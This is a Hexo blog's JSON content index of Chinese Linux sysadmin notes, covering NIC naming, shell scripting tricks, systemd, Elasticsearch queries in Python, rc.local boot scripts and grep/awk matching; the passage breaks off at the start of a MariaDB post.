{"meta":{"title":"Hexo","subtitle":"","description":"","author":"TQ","url":"http://example.com","root":"/"},"pages":[{"title":"About","date":"2024-07-09T06:03:04.176Z","updated":"2024-07-09T06:03:04.176Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"Categories","date":"2024-07-09T06:03:04.176Z","updated":"2024-07-09T06:03:04.176Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2024-07-09T06:03:04.176Z","updated":"2024-07-09T06:03:04.176Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"linux网卡命名规范","slug":"linux网卡命名规范","date":"2023-01-15T16:00:00.000Z","updated":"2023-01-16T03:15:08.000Z","comments":true,"path":"2023/01/16/linux网卡命名规范/","permalink":"http://example.com/2023/01/16/linux%E7%BD%91%E5%8D%A1%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/","excerpt":"","text":"biosdevname 和 net.ifnames 两种命名规范net.ifnamesnet.ifnames 的命名规范为: 设备类型+设备位置+数字 设备类型： 123en 表示Ethernetwl 表示WLANww 表示无线广域网WWAN 实际的例子: 1234567eno1 板载网卡enp0s2 pci网卡ens33 pci网卡wlp3s0 PCI无线网卡wwp0s29f7u2i2 4G modemwlp0s2f1u4u1 连接在USB Hub上的无线网卡enx78e7d1ea46da pci网卡 biosdevnamebiosdevname 的命名规范为： 实际的例子: 123em1 板载网卡p3p4 pci网卡p3p4_1 虚拟网卡 CentOS 7 CentOS 8 网卡命名规则","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"网卡","slug":"网卡","permalink":"http://example.com/tags/%E7%BD%91%E5%8D%A1/"},{"name":"网卡命名规则","slug":"网卡命名规则","permalink":"http://example.com/tags/%E7%BD%91%E5%8D%A1%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99/"}]},{"title":"网卡mac漂移","slug":"网卡mac漂移","date":"2023-01-15T16:00:00.000Z","updated":"2023-01-16T08:04:16.000Z","comments":true,"path":"2023/01/16/网卡mac漂移/","permalink":"http://example.com/2023/01/16/%E7%BD%91%E5%8D%A1mac%E6%BC%82%E7%A7%BB/","excerpt":"","text":"最近遇到一个非常神奇的事情，万兆双口的网卡mac在特定情况下会发生漂移 设备1设备名：X9DRi-LN4+&#x2F;X9DR3-LN4+（微星的机器） 网卡型号：Intel Corporation 82599ES 10-Gigabit（万兆双光口） 网卡链接 系统内核：5.X 网口命名规则：biosdevname&#x3D;1 net.ifnames&#x3D;0 实际网卡名： eth0、eth3 设备2设备名：PowerEdge R720xd（戴尔的机器） 网卡型号：Intel Corporation 82599ES 10-Gigabit（万兆双光口） 系统内核5.X 网卡命名规则：biosdevname&#x3D;1 net.ifnames&#x3D;0 实际网卡名：p6p1、p6p2 从网卡名来看，设备1的网卡没有遵循biosdevname的命名规则，当然，出问题的也就是这台机器。 设备1的机器在正常情况下网卡的mac不会发生漂移，但是如果网卡的配置文件发生变化（硬修改网卡名会碰这个文件），则这两张网卡的mac就会发生漂移（比如说之前mac1所在的网卡是同的，漂移之后mac1所在的网卡就变成不通的了），网卡名则是随机生成的。 造成这种漂移的原因应该与主板bios的配置或者是主板的兼容性有关（猜的），毕竟正规厂商的机器就没有这种问题 所以如果遇到组装机用万兆双光口的机器，改网卡名还是开机自启软改比较好 Linux查看网卡型号、驱动版本、队列数 如何辨别网卡是否为双出口1234567891011121314151617181920212223[root@/]# ethtool -i eth0driver: ixgbeversion: 5.9.4firmware-version: 0x800003df, 255.65535.255expansion-rom-version: bus-info: 0000:88:00.0supports-statistics: yessupports-test: yessupports-eeprom-access: yessupports-register-dump: yessupports-priv-flags: yes[root@/]# ethtool -i eth66driver: ixgbeversion: 5.9.4firmware-version: 0x800003df, 255.65535.255expansion-rom-version: bus-info: 0000:88:00.1supports-statistics: yessupports-test: yessupports-eeprom-access: yessupports-register-dump: yessupports-priv-flags: yes 两个网卡的pci地址都一样bus-info: 0000:88:00.0bus-info: 0000:88:00.1 或者直接lscpi查看网卡 123[root@340915f192636271a3bcfbaf9be1b8ea /]# lspci|grep Eth88:00.0 Ethernet controller: Intel Corporation 82599ES 10-Gigabit SFI/SFP+ Network Connection (rev 01)88:00.1 Ethernet controller: Intel Corporation 82599ES 10-Gigabit SFI/SFP+ Network Connection (rev 01) 这就是双出口的pci地址","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"网卡","slug":"网卡","permalink":"http://example.com/tags/%E7%BD%91%E5%8D%A1/"}]},{"title":"shell显示百分比","slug":"shell显示百分比","date":"2022-11-17T16:00:00.000Z","updated":"2022-11-02T01:52:48.000Z","comments":true,"path":"2022/11/18/shell显示百分比/","permalink":"http://example.com/2022/11/18/shell%E6%98%BE%E7%A4%BA%E7%99%BE%E5%88%86%E6%AF%94/","excerpt":"","text":"awk ‘BEGIN{printf “%.2f%\\n”,’$a’&#x2F;‘$b’*100}’ echo echo &quot;scale=2;$a/6&quot;|bc% awk ‘BEGIN{printf “%.2f%\\n”,’$a’&#x2F;‘$b’*100}’ echo echo &quot;scale=2;$a/6&quot;|bc% shell计算中使用除法，基本默认上都是整除。 比如： num1&#x3D;2 num2&#x3D;3 num3&#x3D;expr $num1 / $num2 这个时候num3&#x3D;0 ,是因为是因为expr不支持浮点除法 解决的方法： num3&#x3D;echo &quot;sclae=2; $num1/$num2&quot; | bc 使用bc工具，sclae控制小数点后保留几位 还有一种方法 awk ‘BEGIN{printf “%.2f\\n”,’$num1‘&#x2F;’$num2‘}’ 如果用百分比表示 awk ‘BEGIN{printf “%.2f%\\n”,(’$num1‘&#x2F;’$num2‘)*100}’ 参考链接：shell 显示百分数","categories":[{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"}],"tags":[{"name":"百分比","slug":"百分比","permalink":"http://example.com/tags/%E7%99%BE%E5%88%86%E6%AF%94/"}]},{"title":"EFI、UEFI、MBR、GPT的区别","slug":"EFI、UEFI、MBR、GPT的区别","date":"2022-11-16T16:00:00.000Z","updated":"2022-10-18T03:21:16.000Z","comments":true,"path":"2022/11/17/EFI、UEFI、MBR、GPT的区别/","permalink":"http://example.com/2022/11/17/EFI%E3%80%81UEFI%E3%80%81MBR%E3%80%81GPT%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"","text":"CSMCSM（兼容性支持模块）是BIOS上Boot选项里的一个下拉子项目（一些老的主板上没有此选项），与Secure Boot（安全启动）是并列项。 CSM开启使得可以支持UEFI启动和非UEFI启动。 若是需要启动传统MBR设备，则需开启CSM。 关闭CSM则变成纯UEFI启动，且完全支持安全启动。 UEFIUEFI属于主板类名词，其作用类似于BIOS。 分区类型简介GPT、MBR则属于硬盘类名词，它们的作用类似一艘航母的骨架，有了这个骨架，我们才可以进行细致到诸如C、D、E等盘符的分区。 一块硬盘接驳主机之后，它的首要任务建立分区列表，分区列表有MBR和GPT两种，其中MBR分区列表支持最大2TB硬盘，GPT分区列表支持最大128PB(1PB&#x3D;1024TB)。 GPT分区列表GPT（GUID Partition Table）：即全局唯一标识分区列表，是一个物理硬盘的分区结构。它用来替代BIOS中的主引导记录分区表（MBR）。 MBR分区列表MBR（Master Boot Record）：即硬盘的主引导记录分区列表，在主引导扇区，位于硬盘的cylinder 0， head 0， sector 1 （Sector是从1开始的）。 UEFI、BIOS和MBR、GPT之间的关系？我们从名词解析可得知，传统BIOS不支持GPT分区列表，仅支持MBR格式。UEFI则是取代传统BIOS，它不支持MBR模式，仅支持GPT格式。 延伸阅读:近两年出现的UEFI主板，采用UEFI+BIOS共存模式，并且BIOS中集成UEFI启动项。 启动盘的启动参数不同启动类型(uefi&#x2F;bios),制作启动盘的参数也不同 启动为 UEFI(非 CSM,不兼容传统的 BIOS 启动),分区类型为 GPT 启动为 BIOS 或 UFEI(兼容传统的 BIOS 启动),分区类型为 MBR 参考：EFI、UEFI、MBR、GPT的区别","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"系统","slug":"系统","permalink":"http://example.com/tags/%E7%B3%BB%E7%BB%9F/"}]},{"title":"ipv6详解","slug":"ipv6","date":"2022-11-01T16:00:00.000Z","updated":"2022-11-02T01:58:00.000Z","comments":true,"path":"2022/11/02/ipv6/","permalink":"http://example.com/2022/11/02/ipv6/","excerpt":"","text":"简介123456fe80开头就像169.254.x.x，是这个网段里没人给你分ip，自动协商的地址，其地址不能在网络上路由，也就是说，通常无法用于上网现在各大运营商用的ipv6电信是240e开头的（240e::/20）移动是2409开头的（2409:8000::/20）联通是2408开头的（2408:8000::/20）其他一些标记有teredo也不是原生ipv6","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"ipv6","slug":"ipv6","permalink":"http://example.com/tags/ipv6/"}]},{"title":"shell创建随机数","slug":"shell创建随机数","date":"2022-11-01T16:00:00.000Z","updated":"2022-11-02T01:58:18.000Z","comments":true,"path":"2022/11/02/shell创建随机数/","permalink":"http://example.com/2022/11/02/shell%E5%88%9B%E5%BB%BA%E9%9A%8F%E6%9C%BA%E6%95%B0/","excerpt":"","text":"使用linux uuid1234567891011#!/bin/bashfunction rand()&#123; min=$1 max=$(($2-$min+1)) num=$(cat /proc/sys/kernel/random/uuid | cksum | awk -F &#x27; &#x27; &#x27;&#123;print $1&#125;&#x27;) echo $(($num%$max+$min))&#125;rnd=$(rand 100 500)echo $rnd 参考链接shell 生成指定范围随机数与随机字符串","categories":[{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"}],"tags":[{"name":"随机数","slug":"随机数","permalink":"http://example.com/tags/%E9%9A%8F%E6%9C%BA%E6%95%B0/"}]},{"title":"python拉取elk的数据","slug":"elk拉取数据","date":"2022-10-05T16:00:00.000Z","updated":"2022-10-18T03:21:26.000Z","comments":true,"path":"2022/10/06/elk拉取数据/","permalink":"http://example.com/2022/10/06/elk%E6%8B%89%E5%8F%96%E6%95%B0%E6%8D%AE/","excerpt":"","text":"使用python中的elasticsearch模块拉取数据，注意elasticsearch模块的版本要与ekl的版本一致（大版本上） 获取elk的服务信息123456789101112131415161718[root@Fish ~]# curl 192.168.3.111:9200&#123; &quot;name&quot; : &quot;elk-masterX&quot;, &quot;cluster_name&quot; : &quot;XXX&quot;, &quot;cluster_uuid&quot; : &quot;XXX&quot;, &quot;version&quot; : &#123; &quot;number&quot; : &quot;7.5.0&quot;, &quot;build_flavor&quot; : &quot;default&quot;, &quot;build_type&quot; : &quot;tar&quot;, &quot;build_hash&quot; : &quot;e9ccaed468e2fac2275a3761849&quot;, &quot;build_date&quot; : &quot;2021-11-26T01:06:52.518XXXX&quot;, &quot;build_snapshot&quot; : false, &quot;lucene_version&quot; : &quot;8.3.0&quot;, &quot;minimum_wire_compatibility_version&quot; : &quot;6.8.0&quot;, &quot;minimum_index_compatibility_version&quot; : &quot;6.0.0-beta1&quot; &#125;, &quot;tagline&quot; : &quot;You Know, for Search&quot;&#125; 如果elk使用https证书认证 使用如下方法获取elk信息 1curl --user user:pwd https://192.168.0.3:9200 -k curl -k 可以跳过证书认证 elk的版本是 7.5.0，所以elasticsearch 模块的大版本也要是7的版本1pip3 install elasticsearch==7.13.0 查看elasticsearch的版本1pip3 list|grep el python连接elasticsearch失败12“URL must include a ‘scheme’, ‘host’, and ‘port’ component (ie ‘https://localhost:9200’)”ValueError: URL must include a ‘scheme’, ‘host’, and ‘port’ component (ie ‘https://localhost:9200’) 123pip3 uninstall elasticsearchpip3 install elasticsearch==7.13.0","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}]},{"title":"系统封装的一些异常报错","slug":"系统封装的异常","date":"2022-09-19T16:00:00.000Z","updated":"2022-09-20T09:03:12.000Z","comments":true,"path":"2022/09/20/系统封装的异常/","permalink":"http://example.com/2022/09/20/%E7%B3%BB%E7%BB%9F%E5%B0%81%E8%A3%85%E7%9A%84%E5%BC%82%E5%B8%B8/","excerpt":"","text":"内核获取方式centos内核大全 error populating transaction anaconda is retrying安装系统时报这个错，估计是改了Package文件夹里的内容后没更新repodata里面的索引，直接就封装了 解决方法：更新repodata里的索引就行 详细操作间『linux_iso镜像解析』","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"系统","slug":"系统","permalink":"http://example.com/tags/%E7%B3%BB%E7%BB%9F/"},{"name":"异常","slug":"异常","permalink":"http://example.com/tags/%E5%BC%82%E5%B8%B8/"}]},{"title":"systemctl,Systemd 入门教程","slug":"systemed使用","date":"2022-09-04T16:00:00.000Z","updated":"2022-09-20T08:54:18.000Z","comments":true,"path":"2022/09/05/systemed使用/","permalink":"http://example.com/2022/09/05/systemed%E4%BD%BF%E7%94%A8/","excerpt":"","text":"简介Systemd 入门教程：命令篇 systemctl命令123456789101112131415161718192021222324252627systemctl list-units ##列出当前系统服务的状态systemctl list-unit-files ##列出服务的开机状态systemctl status sshd ##查看指定服务的状态systemctl stop sshd ##关闭指定服务systemctl start sshd ##开启指定服务systemctl restart sshd ##从新启动服务systemctl enable sshd ##设定指定服务开机开启systemctl disable sshd ##设定指定服务开机关闭systemctl reload sshd ##使指定服务从新加载配置systemctl list-dependencies sshd ##查看指定服务的倚赖关系systemctl mask sshd ##冻结指定服务systemctl unmask sshd ##启用服务systemctl set-default multi-user.target ##开机不开启图形systemctl set-default graphical.target ##开机启动图形 服务状态1234567891011121314151617loaded ##系统服务已经初始化完成，加载过配置active（running） ##正有一个或多个程序正在系统中执行， vsftpd就是这种模式atcive（exited） ##僅執行一次就正常結束的服務， 目前並沒有任何程序在系統中執行atcive（waiting） ##正在執行當中，不過還再等待其他的事件才能继续处理inactive ##服务关闭enbaled ##服务开机启动disabled ##服务开机不自启static ##服务开机启动项不可被管理failed ##系统配置错误","categories":[{"name":"systemed","slug":"systemed","permalink":"http://example.com/categories/systemed/"}],"tags":[{"name":"简介","slug":"简介","permalink":"http://example.com/tags/%E7%AE%80%E4%BB%8B/"}]},{"title":"shell并发操作","slug":"shell并发","date":"2022-08-16T16:00:00.000Z","updated":"2022-09-20T08:55:00.000Z","comments":true,"path":"2022/08/17/shell并发/","permalink":"http://example.com/2022/08/17/shell%E5%B9%B6%E5%8F%91/","excerpt":"","text":"普通多进程原理shell中实现并发，就是把循环体的命令用&amp;符号放入后台运行，1000个任务就会并发1000个线程，运行时间2s左右，比起方案一的1000s，已经非常快了。 例子1234567891011121314151617#!/bin/bash# bam to beddate # 脚本开始时间for ((i=1;i&lt;=1000;i++))do&#123; sleep 1 #sleep 1用以模仿执行一条命令需要花费的时间（可以用真实命令来代替） echo &#x27;success&#x27;$i; &#125;&amp; #用&#123;&#125;把循环体括起来，后加一个&amp;符号，代表每次循环都把命令放入后台运行 #一旦放入后台，就意味着&#123;&#125;里面的命令交给操作系统的一个线程处理了 #循环了1000次，就有1000个&amp;将任务放入后台，操作系统会并发1000个线程来处理 done wait #wait命令表示。等待上面的命令（放入后台的任务）都执行完毕了再往下执行 date # 脚本结束时间 使用FIFO实现“多进程”可以控制每次并发的数量 原理先新建一个FIFO，写入一些字符。一个进程开始前会先从这个FIFO中读走一个字符，执行完之后再写回一个字符。如果FIFO中没有字符，该线程就会等待，fifo就成了一个锁。 例子123456789101112131415161718192021222324252627282930313233343536#!/bin/bash# bam to bedstart_time=`date +%s` #定义脚本运行的开始时间tmp_fifofile=&quot;/tmp/$$.fifo&quot;mkfifo $tmp_fifofile # 新建一个FIFO类型的文件exec 6&lt;&gt;$tmp_fifofile # 将FD6指向FIFO类型rm $tmp_fifofile #删也可以，thread_num=5 # 定义最大线程数#根据线程总数量设置令牌个数#事实上就是在fd6中放置了$thread_num个回车符for ((i=0;i&lt;$&#123;thread_num&#125;;i++));do echodone &gt;&amp;6for i in data/*.bam # 找到data文件夹下所有bam格式的文件do # 一个read -u6命令执行一次，就从FD6中减去一个回车符，然后向下执行 # 当FD6中没有回车符时，就停止，从而实现线程数量控制 read -u6 &#123; echo &quot;great&quot; # 可以用实际命令代替 echo &gt;&amp;6 # 当进程结束以后，再向FD6中加上一个回车符，即补上了read -u6减去的那个 &#125; &amp;donewait # 要有wait，等待所有线程结束stop_time=`date +%s` # 定义脚本运行的结束时间echo &quot;TIME:`expr $stop_time - $start_time`&quot; # 输出脚本运行时间exec 6&gt;&amp;- # 关闭FD6echo &quot;over&quot; # 表示脚本运行结束 管道FIFO基础知识文件描述符（fd）Linux shell中的File Descripter（文件描述符，缩写fd）可以理解为一个指向文件的指针。 默认有三个FD：0，1，2。 1230 Standard Input 标准输入1 Standard Output 正确输出2 Standard Error 错误输出 除了上面三个标准的描述符外，我们还可以在进程中去自定义其他的数字作为文件描述符，后面例子中会出现自定义数字。每一个文件描述符会对应一个打开文件，同时，不同的文件描述符也可以对应同一个打开文件；同一个文件可以被不同的进程打开，也可以被同一个进程多次打开。(跟匿名管道相比；普通管道：私家车，FIFO管道：公车) 命名管道我们之前接触过的管道“1”，其实叫做匿名管道，它左边的输出作为右边命令的输入。这个匿名管道只能为两边的命令提供服务，它是无法让其他进程连接的。 实际上，这两个进程（cat和less）并不知道管道的存在，它们只是从标准文件描述符中读取数据和写入数据。 另外一种管道叫做命名管道，英文（First In First Out，简称FIFO）。 123456789FIFO本质上和匿名管道的功能一样，只不过它有一些特点：1）在文件系统中，FIFO拥有名称，并且是以设备特俗文件的形式存在的；2）任何进程都可以通过FIFO共享数据；3）除非FIFO两端同时有读与写的进程，否则FIFO的数据流通将会阻塞；4）匿名管道是由shell自动创建的，存在于内核中；而FIFO则是由程序创建的（比如mkfifo命令），存在于文件系统中；5）匿名管道是单向的字节流，而FIFO则是双向的字节流；有了上面的基础知识储备后，下面我们来用FIFO来实现shell的多进程并发控制。 参考Linux 1 Shell“ 多线程”，提高工作效率 Linux Shell命名管道FIFO - 多进程动态并发 【转】Linux shell IO重定向 linux shell数据重定向（输入重定向与输出重定向）详细分析","categories":[{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"}],"tags":[{"name":"并发","slug":"并发","permalink":"http://example.com/tags/%E5%B9%B6%E5%8F%91/"}]},{"title":"数据读取模块","slug":"数据读取模块","date":"2022-07-10T16:00:00.000Z","updated":"2022-09-21T08:25:36.000Z","comments":true,"path":"2022/07/11/数据读取模块/","permalink":"http://example.com/2022/07/11/%E6%95%B0%E6%8D%AE%E8%AF%BB%E5%8F%96%E6%A8%A1%E5%9D%97/","excerpt":"","text":"读取xlsx文件12345678910111213141516import pandas as pd# 读取xlsx文件# 安装 pip3 install openpyxldf_xlsx = pd.read_excel(&#x27;/root/test2.xlsx&#x27;, engine=&#x27;openpyxl&#x27;, sheet_name=&#x27;工作表1&#x27;,keep_default_na=False)# keep_default_na=False 把空值不变成NaNprint(df_xlsx) uuid host init_host 地区 运营商 service_name0 d78230 183.215.145.111 183.215.145.222 湖南 xx1 46ef0c 111.8.203.111 湖南 移动 xx df为Dataframe格式数据1234567891011df.shape 返回df/表格的形状（几行几列），例如返回值为(2,6)，则该df是2行6列df.shape[0] 返回行数de.shape[1] 返回列数可以使用for循环对df进行操作：for row in range(0, df_xlsx.shape[0]): print(df_xlsx[&#x27;uuid&#x27;][row])将其转换为列表或者字典 读取csv文件1234567891011import csv# 从csv中读取数据with open(&#x27;/root/test.csv&#x27;,&#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f: lines=csv.reader(f) for line in lines: print(line)[&#x27;a9e7b4&#x27;, &#x27;福建省&#x27;, &#x27;电信&#x27;, &#x27;845&#x27;, &#x27;1000&#x27;][&#x27;43908a&#x27;, &#x27;福建省&#x27;, &#x27;电信&#x27;, &#x27;357&#x27;, &#x27;1000&#x27;][&#x27;8dd28d&#x27;, &#x27;浙江省&#x27;, &#x27;电信&#x27;, &#x27;828&#x27;, &#x27;1000&#x27;] 写入xlsx文件其他类型转为Dataframe两个字典嵌套转Dataframe 1234567891011&gt;&gt;&gt; import pandas as pd&gt;&gt;&gt; my_dict = &#123;&#x27;i&#x27;: &#123;&#x27;a&#x27;:1&#125;, &#x27;love&#x27;: &#123;&#x27;b&#x27;:2&#125;, &#x27;you&#x27;: &#123;&#x27;c&#x27;:3&#125;&#125;&gt;&gt;&gt; a=pd.DataFrame(my_dict)&gt;&gt;&gt; print(a) i love youa 1.0 NaN NaNb NaN 2.0 NaNc NaN NaN 3.0具体例子具体分析吧建议：其他数据格式转Dataframe，最好先使用其他格式排列好数据，再转df，df直接输出到xlsx就行 写入csv文件123456import csvwith open(&#x27;test.csv&#x27;, &#x27;w&#x27;, newline=&#x27;&#x27;,encoding=&#x27;utf-8&#x27;) as f: writer = csv.writer(f) #一行行写入 writer.writerows(list2) elk拉取数据12345678910111213141516171819202122232425262728293031323334353637from elasticsearch import Elasticsearches = Elasticsearch([&quot;192.168.3.1:9200&quot;],timeout=120) body=&#123; &quot;query&quot;: &#123; &quot;bool&quot;: &#123; &quot;must&quot;: [ &#123; &quot;match&quot;: &#123; &quot;IpMd5.keyword&quot;: uuid &#125; &#125; ], &quot;must_not&quot;: [], &quot;should&quot;: [], &quot;filter&quot;: [ &#123; &quot;range&quot;: &#123; &quot;Time&quot;: &#123; &quot;gte&quot;: &quot;2022-06-29T20:20:00+08:00&quot;, &quot;lt&quot;: &quot;2022-06-29T20:25:00+08:00&quot; &#125; &#125; &#125; ] &#125; &#125; &#125; res = es.search(index=&#x27;nodeslogW&#x27;, size=300, body=body)# 返回的是字典的格式 doc = res[&#x27;hits&#x27;][&#x27;hits&#x27;] if len(doc): for item in doc: print(item[&#x27;_source&#x27;][&#x27;Services&#x27;][&#x27;XX&#x27;][&#x27;buffer&#x27;]) 参考：查询表达式 参考：组合查询","categories":[{"name":"文本","slug":"文本","permalink":"http://example.com/categories/%E6%96%87%E6%9C%AC/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"shell脚本EOF解析","slug":"shell脚本EOF妙用","date":"2022-07-07T16:00:00.000Z","updated":"2022-07-08T10:08:34.000Z","comments":true,"path":"2022/07/08/shell脚本EOF妙用/","permalink":"http://example.com/2022/07/08/shell%E8%84%9A%E6%9C%ACEOF%E5%A6%99%E7%94%A8/","excerpt":"","text":"简介使用EOF结合cat命令可以把多行数据写入文件中 这个EOF就像是标识符一样，标明开始、结束，换成STD也一样。 EOF嵌套使用就是把EOF改个名字罢了，不然shell哪知道谁跟谁是一对啊 通过cat配合重定向能够生成文件并追加操作,在它之前先熟悉几个特殊符号: 1234&lt; :输入重定向&gt; :输出重定向&gt;&gt; :输出重定向,进行追加,不会覆盖之前内容&lt;&lt; :标准输入来自命令行的一对分隔号的中间内容. 因为 &lt;&lt; 的意思是：标准输入来自命令行的一对分隔号的中间内容，也就是你在bash上的标准输入，如果有s&#x3D;$(data)的话要使用转义字符s&#x3D;$(data)，不然这个就会执行了，写到文件里的就是s&#x3D;3点11分。并且 &#96;&#96; 都要改成 $()。 123456789101112[root@XX /]# cat &lt;&lt; EOF&gt; hshhs&gt; ksk&gt; EOFhshhsksk[root@XX /]# cat &lt;&lt; STD&gt; h1&gt; STDh1 将内容输出到文件中123456[root@XX /]# cat &lt;&lt; EOF &gt;&gt; m&gt; hello m&gt; EOF[root@XX /]# cat mhello m 嵌套使用123456789101112131415[root@XX /]# cat &lt;&lt; EOF &gt; m&gt; hello m&gt; bye m&gt; cat &lt;&lt; STD &gt; n&gt; hello n&gt; bye n&gt; EOF[root@XX /]# cat mhello mbye mcat &lt;&lt; STD &gt; nhello nbye n 参考linux shell脚本EOF妙用 shell多行重定向方法（多重嵌套）","categories":[{"name":"文本","slug":"文本","permalink":"http://example.com/categories/%E6%96%87%E6%9C%AC/"}],"tags":[{"name":"EOF","slug":"EOF","permalink":"http://example.com/tags/EOF/"}]},{"title":"centos7安装nload流量监控","slug":"centos7安装nload流量监控","date":"2022-07-05T16:00:00.000Z","updated":"2022-07-07T04:48:26.000Z","comments":true,"path":"2022/07/06/centos7安装nload流量监控/","permalink":"http://example.com/2022/07/06/centos7%E5%AE%89%E8%A3%85nload%E6%B5%81%E9%87%8F%E7%9B%91%E6%8E%A7/","excerpt":"","text":"方法一1yum -y install nload 方法二123456789yum install -y gccyum install -y gcc-c++yum install -y ncurses-devel wget http://www.roland-riegel.de/nload/nload-0.7.4.tar.gztar zxvf nload-0.7.4.tar.gzcd nload-0.7.4./configuremake;make install 使用1nload ppp0 ppp1 ppp2 参考：Centos7安装nload流量监控","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}]},{"title":"开机自启 rc.d/rc.loacl","slug":"开机自启脚本","date":"2022-06-29T16:00:00.000Z","updated":"2022-07-06T09:01:28.000Z","comments":true,"path":"2022/06/30/开机自启脚本/","permalink":"http://example.com/2022/06/30/%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E8%84%9A%E6%9C%AC/","excerpt":"","text":"rc.d&#x2F;rc.local简介&#x2F;etc&#x2F;rc.local 是 &#x2F;etc&#x2F;rc.d&#x2F;rc.local的软连接（系统安装时根据&#x2F;etc&#x2F;rc.d&#x2F;rc.local生成的） 所以开机自启实际上是执行&#x2F;etc&#x2F;rc.d&#x2F;rc.local这个文件（该文件需要可执行权限，文件头为 #!&#x2F;bin&#x2F;bash） 123[root /]# ls -l /etc/rc.local lrwxrwxrwx 1 root root 13 Aug 24 2021 /etc/rc.local -&gt; rc.d/rc.local 问题一：rc.d&#x2F;rc.loacl无法执行一般来说，造成这种情况的是由于该文件没有可执行权限下面来说下不一般的 首先看看有没有rc.local这个服务 12systemctl list-unit-files|grep rc.localrc-local.service static 再看看rc.local服务的状态 12345678910111213systemctl status rc-local.service● rc-local.service - /etc/rc.d/rc.local Compatibility Loaded: loaded (/usr/lib/systemd/system/rc-local.service; static; vendor preset: disabled) Active: failed (Result: exit-code) since Thu 2022-06-30 14:39:40 CST; 7min ago Process: 1074 ExecStart=/etc/rc.d/rc.local start (code=exited, status=203/EXEC)Jun 30 14:39:39 cac8821bbb6ae2bd3553cc0552e923ddXX systemd[1]: Starting /etc/rc.d/rc.local Compatibility...Jun 30 14:39:40 cac8821bbb6ae2bd3553cc0552e923ddXX systemd[1]: rc-local.service: control process exited, code=exited status=203Jun 30 14:39:40 cac8821bbb6ae2bd3553cc0552e923ddXX systemd[1]: Failed to start /etc/rc.d/rc.local Compatibility.Jun 30 14:39:40 cac8821bbb6ae2bd3553cc0552e923ddXX systemd[1]: Unit rc-local.service entered failed state.Jun 30 14:39:40 cac8821bbb6ae2bd3553cc0552e923ddXX systemd[1]: rc-local.service failed. 很显然，服务启动失败 一般来说服务组件是没问题的，那么我们检查下&#x2F;etc&#x2F;rc.d&#x2F;rc.local文件，看看是不是该文件格式不正确 123cat /etc/rc.d/rc.local/bin/bash /s.sh 果然，少了#!/bin/bash作为第一行 加上后就OK了 参考：树莓派：【FAILED】 Failed to start &#x2F;etc&#x2F;rc.local Compatibility.","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}]},{"title":"linux查找字符串所在行","slug":"linux查找字符串所在行","date":"2022-06-22T16:00:00.000Z","updated":"2022-06-23T05:49:30.000Z","comments":true,"path":"2022/06/23/linux查找字符串所在行/","permalink":"http://example.com/2022/06/23/linux%E6%9F%A5%E6%89%BE%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%80%E5%9C%A8%E8%A1%8C/","excerpt":"","text":"模糊匹配 输出行号 grep 12# 输出内容同时输出行号grep -n &quot;要匹配的字符串&quot; 文件名 awk 123# 输出行号，并不输出内容# 注意是单引号awk &#x27;/要匹配字符串/&#123;print NR&#125;&#x27; 文件名 这里涉及一个小的知识点，如何在awk中写变量呢。比如“要匹配字符串”位置想要写入一个变量，要在变量外加单引号，再加双引号： 123456# 变量赋值word=hello# 在awk中引入变量, 打印变量所在的行awk &#x27;/&quot;&#x27;$&#123;word&#125;&#x27;&quot;/&#123;print $0&#125;&#x27; file.txt# 其中$&#123;word&#125;是变量较好的写法，$word 的写法也可以执行 精确匹配（全匹配）输出行号 grep 1grep -wn &quot;要匹配的字符串&quot; 文件名 其中 grep -w 是完全匹配要匹配的字符串，字符串只是字段内一部分也可以匹配。比如， 1234# 结果为abcd, abcde, abc等grep &quot;abc&quot; # 结果为abcgrep -w &quot;abc&quot; awk awk并不能像grep那样去过滤单词。grep可以过滤到单词，awk只能过滤到字段。 123456# 匹配以逗号为分隔（如csv）的第三列/第三个字段，打印行号awk -F, &#x27;$3==&quot;要匹配的字符串&quot; &#123;print NR&#125;&#x27; 文件名# 匹配以逗号为分隔（如csv）的第三列/第三个字段# 打印该行内容 写&#123;print&#125;或&#123;print $0&#125; 都可以awk -F, &#x27;$3==&quot;要匹配的字符串&quot; &#123;print&#125;&#x27; 文件名 参考linux查找字符串所在行，输出行号","categories":[{"name":"文本","slug":"文本","permalink":"http://example.com/categories/%E6%96%87%E6%9C%AC/"}],"tags":[{"name":"awk","slug":"awk","permalink":"http://example.com/tags/awk/"},{"name":"grep","slug":"grep","permalink":"http://example.com/tags/grep/"}]},{"title":"mariadb数据库使用","slug":"mariadb使用","date":"2022-06-20T16:00:00.000Z","updated":"2022-06-29T10:35:52.000Z","comments":true,"path":"2022/06/21/mariadb使用/","permalink":"http://example.com/2022/06/21/mariadb%E4%BD%BF%E7%94%A8/","excerpt":"","text":"安装： 12345yum -y install mariadb-server mariadb 安装完后systemctl start 